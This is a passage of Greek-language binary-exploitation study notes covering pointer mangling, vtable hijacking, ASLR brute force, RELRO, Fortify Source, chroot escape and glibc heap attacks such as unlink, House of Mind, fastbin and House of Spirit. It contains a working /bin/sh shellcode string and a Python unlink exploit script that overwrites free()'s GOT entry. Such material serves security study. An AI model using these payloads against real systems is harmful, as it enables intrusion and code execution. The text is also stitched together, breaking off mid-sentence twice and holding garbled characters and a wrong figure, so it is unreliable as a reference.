Αυτό που συμβαίνει είναι ότι τα EIP και ESP περνιούνται από τη **συνάρτηση `PTR_MANGLE`**, οπότε οι **αρχιτεκτονικές ευάλωτες σε αυτήν την επίθεση είναι οι ίδιες με παραπάνω**.\
Είναι χρήσιμα για ανάκτηση σφαλμάτων ή διακοπές.\
Ωστόσο, από ό,τι έχω διαβάσει, οι άλλοι καταχωρητές δεν προστατεύονται, **έτσι αν υπάρχει ένα `call ebx`, `call esi` ή `call edi`** μέσα στη συνάρτηση που καλείται, μπορεί να πάρει τον έλεγχο. Ή μπορείτε επίσης να τροποποιήσετε τον EBP για να τροποποιήσετε το ESP.

**VTable και VPTR στη C++**

Κάθε κλάση έχει μια **Vtable** που είναι ένας πίνακας με **δείκτες προς μεθόδους**.

Κάθε αντικείμενο μιας **κλάσης** έχει ένα **VPtr** που είναι ένας **δείκτης** προς τον πίνακα της κλάσης του. Το VPtr είναι μέρος της κεφαλίδας κάθε αντικειμένου, οπότε αν μια **αντικατάσταση** του **VPtr** επιτευχθεί, μπορεί να **τροποποιηθεί** ώστε να δείχνει σε μια ψεύτικη μέθοδο, έτσι ώστε η εκτέλεση μιας συνάρτησης να πάει στο shellcode.

## **Προληπτικά μέτρα και αποφυγές**

**Επιστροφή στο printf**

Είναι μια τεχνική για να μετατρέψετε μια υπερχείλιση προς ένα σφάλμα συμβολοσειράς. Συνίσταται στο να αντικαταστήσετε το EIP ώστε να δείχνει σε ένα printf της συνάρτησης και να του δώσετε ως όρισμα μια συμβολοσειρά μορφοποίησης που έχει τροποποιηθεί για να λάβετε τιμές σχετικά με την κατάσταση της διεργασίας.

**Επίθεση σε βιβλιοθήκες**

Οι βιβλιοθήκες βρίσκονται σε μια θέση με 16 bits τυχαιότητα = 65636 πιθανές διευθύνσεις. Αν ένα ευάλωτος διακομιστής καλεί τη fork(), ο χώρος διευθύνσεων μνήμης αντιγράφεται στη διεργασία-παιδί και παραμένει ανέπαφος. Έτσι, μπορείτε να προσπαθήσετε ένα brute force στη συνάρτηση usleep() της libc δίνοντάς της ως όρισμα "16", έτσι ώστε όταν καθυστερήσει περισσότερο από το αναμενόμενο στην απάντηση, θα έχετε βρει αυτήν τη συνάρτηση. Γνωρίζοντας πού βρίσκεται αυτή η συνάρτηση, μπορείτε να λάβετε το delta\_mmap και να υπολογίσετε τις υπόλοιπες.

Η μοναδική ασφαλής λύση για να είστε σίγουροι ότι το ASLR λειτουργεί είναι να χρησιμοποιήσετε αρχιτεκτονική 64bit. Εκεί δεν υπάρχουν επιθέσεις brute force.

### Relro

Το **Relro (Read only Relocation)** επηρεάζει τις άδειες μνήμης παρόμοια με το NX. Η διαφορά είναι ότι ενώ με το NX κάνει τη στοίβα εκτελέσιμη, το RELRO κάνει **κάποια πράγματα μόνο για ανάγνωση**, οπότε **δεν μπορούμε να γράψουμε** σε αυτά. Ο πιο συνηθισμένος τρόπος που έχω δει αυτό να είναι εμπόδιο είναι να μας εμποδίζει από το να κάνουμε μια **αντικατάσταση πίνακα got**, το οποίο θα καλυφθεί αργότερα. Ο πίνακας got κρατά διευθύνσεις για τις συναρτήσεις της libc ώστε το δυαδικό να γνωρίζει ποιες είναι οι διευθύνσεις και να τις καλεί. Ας δούμε πώς είναι οι άδειες μνήμης για μια εγγραφή πίνακα got για ένα δυαδικό με και χωρίς relro.

Με relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Χωρίς relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Για το δυαδικό **χωρίς relro**, βλέπουμε ότι η διεύθυνση καταχώρησης `got` για το `fgets` είναι `0x404018`. Κοιτώντας τις αντιστοιχίσεις μνήμης βλέπουμε ότι ανήκει μεταξύ `0x404000` και `0x405000`, τα οποία έχουν τις **άδειες `rw`**, που σημαίνει ότι μπορούμε να διαβάσουμε και να γράψουμε σε αυτό. Για το δυαδικό **με relro**, βλέπουμε ότι η διεύθυνση πίνακα `got` για την εκτέλεση του δυαδικού (είναι ενεργοποιημένο το pie οπότε αυτή η διεύθυνση θα αλλάξει) είναι `0x555555557fd0`. Στις αντιστοιχίσεις μνήμης του δυαδικού αυτού, ανήκει μεταξύ `0x0000555555557000` και `0x0000555555558000`, τα οποία έχουν τη μνήμη **άδεια `r`**, που σημαίνει ότι μπορούμε μόνο να διαβάσουμε από αυτήν.

Οπότε ποια είναι η **παράκαμψη**; Η τυπική παράκαμψη που χρησιμοποιώ είναι απλά να μην γράφω σε περιοχές μνήμης που το relro προκαλεί να γίνουν μόνο για ανάγνωση, και **να βρω έναν διαφορετικό τρόπο για να εκτελέσω κώδικα**.

Σημειώστε ότι για να συμβεί αυτό, το δυαδικό πρέπει να γνωρίζει πριν από την εκτέλεση τις διευθύνσεις των συναρτήσεων:

* Αργή δέσμευση: Η διεύθυνση μιας συνάρτησης αναζητείται την πρώτη φορά που καλείται η συνάρτηση. Έτσι, η GOT πρέπει να έχει άδειες εγγραφής κατά τη διάρκεια της εκτέλεσης.
* Δέσμευση τώρα: Οι διευθύνσεις των συναρτήσεων λύνονται στην αρχή της εκτέλεσης, και στη συνέχεια δίνονται δικαιώματα μόνο για ανάγνωση σε ευαίσθητες ενότητες όπως .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Για να ελέγξετε αν ένα πρόγραμμα χρησιμοποιεί Δέσμευση τώρα μπορείτε να κάνετε:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Όταν το δυαδικό φορτώνεται στη μνήμη και μια συνάρτηση καλείται για πρώτη φορά, πηγαίνει στο PLT (Procedure Linkage Table), από εκεί γίνεται ένα άλμα (jmp) στο GOT και ανακαλύπτει ότι αυτή η καταχώρηση δεν έχει επιλυθεί (περιέχει μια διεύθυνση που ακολουθεί το PLT). Έτσι καλεί τον Runtime Linker ή rtfd για να επιλύσει τη διεύθυνση και να την αποθηκεύσει στο GOT.

Όταν καλείται μια συνάρτηση, καλείται το PLT, το οποίο έχει τη διεύθυνση του GOT όπου αποθηκεύεται η διεύθυνση της συνάρτησης, οπότε ανακατευθύνει τη ροή εκεί και έτσι καλείται η συνάρτηση. Ωστόσο, αν είναι η πρώτη φορά που καλείται η συνάρτηση, αυτό που υπάρχει στο GOT είναι η επόμενη εντολή του PLT, οπότε η ροή ακολουθεί τον κώδικα του PLT (rtfd) και βρίσκει τη διεύθυνση της συνάρτησης, την αποθηκεύει στο GOT και την καλεί.

Κατά τη φόρτωση ενός δυαδικού στη μνήμη, ο μεταγλωττιστής έχει πει σε ποια μετατόπιση πρέπει να τοποθετήσει δεδομένα που πρέπει να φορτωθούν κατά την εκτέλεση του προγράμματος.

Αργή δέσμευση —> Η διεύθυνση της συνάρτησης αναζητείται την πρώτη φορά που καλείται η συγκεκριμένη συνάρτηση, έτσι το GOT έχει δικαιώματα εγγραφής ώστε όταν αναζητηθεί, να αποθηκευτεί εκεί και να μην χρειαστεί να αναζητηθεί ξανά.

Bind now —> Οι διευθύνσεις των συναρτήσεων αναζητούνται κατά τη φόρτωση του προγράμματος και αλλάζονται τα δικαιώματα των ενοτήτων .got, .dtors, .ctors, .dynamic, .jcr σε μόνο ανάγνωση. **-z relro** και **-z now**

Παρόλα αυτά, γενικά τα προγράμματα δεν είναι περίπλοκα με αυτές τις επιλογές, οπότε αυτές οι επιθέσεις παραμένουν εφικτές.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> Για να δείτε αν χρησιμοποιούν το BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ή =2**

Προσπαθεί να αναγνωρίσει τις συναρτήσεις που αντιγράφουν από ένα μέρος σε άλλο με ανασφαλή τρόπο και να τις αλλάξει με μια ασφαλή συνάρτηση.

Για παράδειγμα:\
char buf\[16];\
strcpy(but, source);

Το αναγνωρίζει ως μη ασφαλές και τότε αντικαθιστά το strcpy() με \_\_strcpy\_chk() χρησιμοποιώντας το μέγεθος του buffer ως μέγιστο μέγεθος αντιγραφής.

Η διαφορά μεταξύ **=1** ή **=2** είναι ότι:

Το δεύτερο δεν επιτρέπει το **%n** να προέρχεται από μια ενότητα με δικαιώματα εγγραφής. Επιπλέον, η παράμετρος για την άμεση πρόσβαση σε ορίσματα μπορεί να χρησιμοποιηθεί μόνο αν χρησιμοποιηθούν οι προηγούμενες, δηλαδή, μπορεί να χρησιμοποιηθεί μόνο το **%3$d** αν πρώτα έχουν χρησιμοποιηθεί τα **%2$d** και **%1$d**

Για να εμφανιστεί το μήνυμα σφάλματος χρησιμοποιείται το argv\[0], οπότε αν τοποθετηθεί εκεί η διεύθυνση ενός άλλου μέρους (όπως μια καθολική μεταβλητή), το μήνυμμα σφάλματος θα εμφανίσει το περιεχόμενο αυτής της μεταβλητής. Σελ. 191

**Αντικατάσταση του Libsafe**

Ενεργοποιείται με: LD\_PRELOAD=/lib/libsafe.so.2\
ή\
“/lib/libsave.so.2” > /etc/ld.so.preload

Ορισμένες επικίνδυνες κλήσεις συναρτήσεων αντικαθίστανται με ασφαλείς. Δεν είναι τυποποιημένο. (μόνο για x86, όχι για μεταγλωττίσεις με -fomit-frame-pointer, όχι στατικές μεταγλωττίσεις, όχι όλες οι ευάλωτες συναρτήσεις γίνονται ασφαλείς και το LD\_PRELOAD δεν λειτουργεί σε δυαδικά με suid).

**ASCII Armored Address Space**

Αφορά τη φόρτωση κοινόχρηστων βιβλιοθηκών από 0x00000000 έως 0x00ffffff ώστε να υπάρχει πάντα ένα byte 0x00. Ωστόσο, αυτό στην πραγματικότητα δεν σταματά σχεδόν καμία επίθεση, ιδίως σε little endian.

**ret2plt**

Αποτελείται από ROP έτσι ώστε να καλείται η συνάρτηση strcpy@plt (από το plt) και να δείχνει στην καταχώρηση του GOT και να αντιγράφει τον πρώτο byte της συνάρτησης που θέλει να καλέσει (system()). Στη συνέχεια, το ίδιο γίνεται δείχνοντας στο GOT+1 και αντιγράφοντας το 2ο byte του system()... Τελικά καλείται η διεύθυνση που είναι αποθηκευμένη στο GOT, η οποία θα είναι η system()

**Ψευδές EBP**

Για τις συναρτήσεις που χρησιμοποιούν το EBP ως καταχώρηση για να δείχνουν στα ορίσματα, κατά την τροποποίηση του EIP και την αναφορά στο system(), πρέπει να έχει τροποποιηθεί και το EBP ώστε να δείχνει σε μια περιοχή μνήμης που έχει 2 bytes οποιαδήποτε και στη συνέχεια τη διεύθυνση προς &”/bin/sh”.

**Κλουβιά με chroot()**

debootstrap -arch=i386 hardy /home/user —> Εγκαθιστά ένα βασικό σύστημα σε ένα συγκεκριμένο υποκατάλογο

Ένας διαχειριστής μπορεί να βγει από αυτά τα κλουβιά κάνοντας: mkdir foo; chroot foo; cd ..

**Εργαλεία Κώδικα**

Valgrind —> Ανιχνεύει σφάλματα\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Υπερχείλιση Σωρού: Βασικά εκμεταλλεύματα**

**Κομμάτι που έχει εκχωρηθεί**

prev\_size |\
size | —Κεφαλίδα\
\*mem | Δεδομένα

**Ελεύθερο κομμάτι**

prev\_size |\
size |\
\*fd | Δείκτης προς το εμπρός κομμάτι\
\*bk | Δείκτης προς το πίσω κομμάτι —Κεφαλίδα\
\*mem | Δεδομένα

Τα ελεύθερα κομμάτια είναι σε μια λίστα διπλά συνδεδεμένη (bin) και δεν μπορούν να υπάρχουν ποτέ δύο ελεύθερα κομμάτια μαζί (συγχωνεύονται)

Στο "size" υπάρχουν bits για να υποδεικνύουν: Αν το προηγούμενο κομμάτι είναι σε χρήση, αν το κομμάτι έχει εκχωρηθεί μέσω του mmap() και αν το κομμάτι ανήκει στον κύριο arena.

Όταν απελευθερώνεται ένα κομμάτι, αν κάποιο από τα γειτονικά είναι ελεύθερο, αυτά συγχωνεύονται μέσω της μακροεντολής unlink() και το μεγαλύτερο νέο κομμάτι περνά στο frontlink() για να εισαχθεί στον κατάλληλο bin.

unlink(){\
BK = P->bk; —> Το BK του νέου chunk είναι αυτό που είχε το προηγούμενο ελεύθερο chunk\
FD = P->fd; —> Το FD του νέου chunk είναι αυτό που είχε το προηγούμενο ελεύθερο chunk\
FD->bk = BK; —> Το BK του επόμενου chunk δείχνει στο νέο chunk\
BK->fd = FD; —> Το FD του προηγο
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Σημαντικό να είναι το bit που υποδεικνύει ότι το προηγούμενο κομμάτι είναι ελεύθερο να είναι 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, ώστε να νομίζει ότι το "size" του 3ου κομματιού είναι 4bytes πίσω (δείχνει στο prev\_size) εκεί όπου ελέγχει αν το 2ο κομμάτι είναι ελεύθερο**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Στο payload στην αρχή θα βάλουμε 8bytes γεμίσματος**

**got\_free = pack("\<I", 0x08048300 - 12) #Διεύθυνση της free() στο plt-12 (θα είναι η διεύθυνση που θα αντικατασταθεί για να εκτελεστεί το shellcode τη 2η φορά που καλείται η free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Όπως αναφέρθηκε το payload ξεκινά με 8 bytes γεμίσματος επειδή ναι**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Τροποποιείται το 2ο κομμάτι, το got\_free δείχνει όπου θα αποθηκεύσουμε τη διεύθυνση addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() απελευθερώνοντας με αντίστροφη σειρά (wargame)**

Έχουμε έλεγχο 3 συνεχόμενων chunks και απελευθερώνονται με αντίστροφη σειρά από την κράτηση.

Σε αυτήν την περίπτωση:

Στο κομμάτι c τοποθετείται το shellcode

Το κομμάτι a το χρησιμοποιούμε για να αντικαταστήσουμε το b έτσι ώστε το μέγεθος να έχει απενεργοποιημένο το bit PREV\_INUSE ώστε να νομίζει ότι το κομμάτι a είναι ελεύθερο.

Επιπλέον, αντικαθιστούμε στην κεφαλή b το μέγεθος ώστε να είναι -4.

Έτσι, το πρόγραμμα θα νομίζει ότι το "a" είναι ελεύθερο και σε ένα bin, οπότε θα καλέσει το unlink() για να το αποσυνδέσει. Ωστόσο, καθώς το bit PREV\_SIZE είναι -4, θα νομίζει ότι το κομμάτι "a" πραγματικά ξεκινάει από το b+4. Δηλαδή, θα κάνει unlink() σε ένα κομμάτι που ξεκινάει από το b+4, οπότε στο b+12 θα είναι το δείκτης "fd" και στο b+16 θα είναι ο δείκτης "bk".

Με αυτόν τον τρόπο, αν βάλουμε τη διεύθυνση του shellcode στο bk και τη διεύθυνση της συνάρτησης "puts()"-12 στο fd έχουμε το payload μας.

**Τεχνική Frontlink**

Καλείται το frontlink όταν κάτι απελευθερώνεται και κανένα από τα διπλανά του κομμάτια δεν είναι ελεύθερα, δεν καλείται το unlink() αλλά καλείται απευθείας το frontlink().

Χρήσιμη ευπάθεια όταν το malloc που επιτίθεται δεν απελευθερώνεται ποτέ (free()).

Απαιτεί:

Ένα buffer που μπορεί να υπερχειλιστεί με τη συνάρτηση εισόδου δεδομένων

Ένα buffer δίπλα σε αυτό που πρέπει να απελευθερωθεί και στο οποίο θα τροποποιηθεί το πεδίο fd της κεφαλής του χάρη στην υπερχείλιση του προηγούμενου buffer

Ένα buffer προς απελευθέρωση με μέγεθος μεγαλύτερο από 512 αλλά μικρότερο από τον προηγούμενο buffer

Ένα buffer που δηλώνεται πριν το βήμα 3 που επιτρέπει την υπερεγγραφή του prev\_size αυτού

Με αυτόν τον τρόπο ελέγχοντας δύο mallocs με ανεξέλεγκτο τρόπο και έναν ελεγχόμενο αλλά που απελευθερώνεται μόνο αυτός, μπορούμε να κάνουμε ένα exploit.

**Ευπάθεια double free()**

Αν κληθεί δύο φορές η free() με την ίδια διεύθυνση, υπάρχουν δύο bins που δείχνουν στην ίδια διεύθυνση.

Σε περίπτωση που θέλουμε να χρησιμοποιήσουμε έναν από αυτούς, θα γίνει χωρίς προβλήματα. Σε περίπτωση που θέλουμε να χρησιμοποιήσουμε τον άλλο, θα του ανατεθεί το ίδιο χώρο, έτσι τα δείκτες "fd" και "bk" θα είναι παραπλανητικοί με τα δεδομένα που θα γράψει η προηγούμενη κράτηση.

**After free()**

Ένας προηγουμένως απελευθερωμένος δείκτης χρησιμοποιείται ξανά χωρίς έλεγχο.

## **8 Υπερχειλίσεις στην Heap: Προηγμένα Exploits**

Οι τεχνικές Unlink() και FrontLink() αφαιρέθηκαν με την τροποποίηση της συνάρτησης unlink().

**The house of mind**

Απαιτείται μόνο μια κλήση στη free() για να προκαλέσει την εκτέλεση κώδικα αυθαίρετα. Ενδιαφέρον παρουσιάζει η αναζήτηση ενός δεύτερου κομματιού που μπορεί να υπερχειλιστεί από ένα προηγούμενο και να απελευθερωθεί.

Μια κλήση στη free() προκαλεί την κλήση της public\_fREe(mem), η οποία κάνει:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Επιστρέφει ένα δείκτη στη διεύθυνση όπου ξεκινά το κομμάτι (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

Στο \[1] ελέγχει το πεδίο size το bit NON\_MAIN\_ARENA, το οποίο μπορεί να τροποποιηθεί ώστε η επιστροφή να είναι true και να εκτελεστεί το heap\_for\_ptr() που κάνει ένα and στο "mem" αφήνοντας τα 2,5 λιγότερο σημαντικά bytes (στην περίπτωσή μας από το 0x0804a000 αφήνει το 0x08000000) και προσπελαύνει το 0x08000000->ar\_ptr (σαν ένα struct heap\_info)

Με αυτόν τον τρόπο, αν μπορούμε να ελέγξουμε ένα κομμάτι για παράδειγμα στο 0x0804a000 και θα απελευθερωθεί ένα κομμάτι στο **0x081002a0** μπορούμε να φτάσουμε στη διεύθυνση 0x08100000 και να γράψουμε ό,τι θέλουμε, για παράδειγμα **0x0804a000**. Όταν αυτό το δεύτερο κομμάτι απελευθερωθεί, θα βρει ότι το heap\_for\_ptr(ptr)->ar\_ptr επιστρέφει αυτό που έχουμε γράψει στο 0x08100000 (καθώς εφαρμόζεται το and στο 0x081002a0 που είδαμε πριν και από εκεί παίρνει την τιμή των πρώτων 4 bytes, το ar\_ptr)

Με αυτόν τον τρόπο καλείται το \_int\_free(ar\_ptr, mem), δηλαδή, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Όπως είδαμε προηγουμένως μπορούμε να ελέγξουμε την τιμή του av, καθώς είναι αυτό που γράψαμε στο κομμάτι που θα απελευθερωθεί.

Όπως ορίζεται το unsorted\_chunks, γνωρίζουμε ότι:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Επομένως, αν στο av->bins\[2] γράψουμε την τιμή του \_\_DTOR\_END\_\_-12 στην τελευταία εντολή θα γραφτεί στο \_\_DTOR\_END\_\_ η διεύθυνση του δεύτερου κομματιού.

Δηλαδή, στο πρώτο κομμάτι πρέπει ν
Αυτή η τεχνική δεν είναι πλέον εφαρμόσιμη επειδή εφαρμόστηκε σχεδόν το ίδιο patch με αυτό του unlink. Συγκρίνουν αν η νέα τοποθεσία προς την οποία δείχνει επίσης δείχνει προς αυτόν.

**Fastbin**

Είναι μια παραλλαγή του The house of mind

μας ενδιαφέρει να εκτελέσουμε τον ακόλουθο κώδικα που εκτελείται μετά τον έλεγχο της συνάρτησης \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Με fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Με αυτόν τον τρόπο, αν τοποθετηθεί στο "fb" δίνει τη διεύθυνση μιας συνάρτησης στην GOT, σε αυτή τη διεύθυνση θα τοποθετηθεί η διεύθυνση του κομματιού που έχει αντικατασταθεί. Για να γίνει αυτό, θα πρέπει η αρένα να είναι κοντά στις διευθύνσεις των dtors. Πιο συγκεκριμένα, το av->max\_fast πρέπει να βρίσκεται στη διεύθυνση που θα αντικατασταθεί.

Δεδομένου ότι με το The House of Mind είδαμε ότι εμείς ελέγχουμε τη θέση του av.

Έτσι, αν στο πεδίο size βάλουμε ένα μέγεθος 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() θα μας επιστρέψει fastbins\[-1], που θα δείχνει στο av->max\_fast

Σε αυτή την περίπτωση, το av->max\_fast θα είναι η διεύθυνση που θα αντικατασταθεί (όχι στην οποία δείχνει, αλλά αυτή η θέση θα αντικατασταθεί).

Επιπλέον, πρέπει να ισχύει ότι το κομμάτι που είναι δίπλα στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το μέγεθος του απελευθερωμένου κομματιού είναι 8, σε αυτό το ψεύτικο κομμάτι πρέπει απλά να βάλουμε ένα μέγεθος μεγαλύτερο από 8 (καθώς επίσης η shellcode θα είναι στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε ένα jmp που θα πέσει σε nops).

Επιπλέον, αυτό το ίδιο ψεύτικο κομμάτι πρέπει να είναι μικρότερο από το av->system\_mem. Το av->system\_mem βρίσκεται 1848 bytes πιο πέρα.

Λόγω των μηδενικών του \_DTOR\_END\_ και των λίγων διευθύνσεων στην GOT, καμία από αυτές τις διευθύνσεις δεν είναι κατάλληλες για αντικατάσταση, οπότε ας δούμε πώς να εφαρμόσουμε το fastbin για επίθεση στη στοίβα.

Ένας άλλος τρόπος επίθεσης είναι να ανακατευθύνουμε το **av** προς τη στοίβα.

Αν τροποποιήσουμε το μέγεθος ώστε να είναι 16 αντί για 8 τότε: fastbin\_index() θα μας επιστρέψει fastbins\[0] και μπορούμε να το χρησιμοποιήσουμε για να αντικαταστήσουμε τη στοίβα.

Για αυτό δεν πρέπει να υπάρχει κανένα canary ή περίεργες τιμές στη στοίβα, πρέπει να βρισκόμαστε σε αυτήν: 4bytes μηδενικά + EBP + RET

Τα 4 bytes μηδενικά απαιτούνται για να είναι το **av** σε αυτή τη διεύθυνση και το πρώτο στοιχείο ενός **av** είναι το mutex που πρέπει να είναι 0.

Το **av->max\_fast** θα είναι το EBP και θα είναι μια τιμή που θα μας επιτρέψει να παρακάμψουμε τους περιορισμούς.

Στο **av->fastbins\[0]** θα αντικατασταθεί με τη διεύθυνση του **p** και θα είναι το RET, έτσι θα πηδήξει στη shellcode.

Επιπλέον, στο **av->system\_mem** (1484bytes πάνω από τη θέση στη στοίβα) θα υπάρχει αρκετό σκουπίδι που θα μας επιτρέψει να παρακάμψουμε τον έλεγχο που γίνεται.

Επιπλέον, πρέπει να ισχύει ότι το κομμάτι που είναι δίπλα στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το μέγεθος του απελευθερωμένου κομματιού είναι 16, σε αυτό το ψεύτικο κομμάτι πρέπει απλά να βάλουμε ένα μέγεθος μεγαλύτερο από 8 (καθώς επίσης η shellcode θα είναι στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε ένα jmp που θα πέσει σε nops που ακολουθούν μετά το πεδίο size του νέου ψεύτικου κομματιού.

**The House of Spirit**

Σε αυτήν την περίπτωση, αναζητούμε ένα δείκτη σε ένα malloc που μπορεί να τροποποιηθεί από τον επιτιθέμενο (π.χ. ο δείκτης να βρίσκεται στη στοίβα κάτω από ένα πιθανό overflow σε μια μεταβλητή).

Έτσι, θα μπορούσαμε να κάνουμε αυτό το δείκτη να δείχνει όπου θέλουμε. Ωστόσο, όχι οποιαδήποτε τοποθεσία είναι έγκυρη, το μέγεθος του Ϩεύτικου κομματιού πρέπει να είναι μικρότερο από το av->max\_fast και πιο συγκεκριμένα ίσο με το μέγεθος που ζητείται σε μια μελλοντική κλήση στο malloc()+8. Γι' αυτό, αν γνωρίζουμε ότι μετά από αυτόν τον ευάλωτο δείκτη καλείται το malloc(40), το μέγεθος του Ϩεύτικου κομματιού πρέπει να είναι ίσο με 48.

